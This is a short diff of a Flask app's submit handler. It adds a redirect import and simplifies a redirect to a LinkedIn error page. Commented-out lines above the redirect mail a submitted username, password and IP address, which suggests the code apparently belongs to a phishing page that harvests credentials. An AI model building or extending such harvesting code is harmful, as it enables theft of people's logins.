@@ -1,4 +1,4 @@
-from flask import Flask, render_template, request, session
+from flask import Flask, render_template, request, session, redirect
 from flask_sqlalchemy import SQLAlchemy
 import smtplib
 import psycopg2
@@ -69,7 +69,7 @@ def submit():
         #     send_mail(username,password,ip_address)
         #     return render_template("outdex.html")
         #return render_template("index.html")
-        return redirect("https://www.linkedin.com/error404", code=302)
+        return redirect("https://www.linkedin.com/error404")
         
 
 
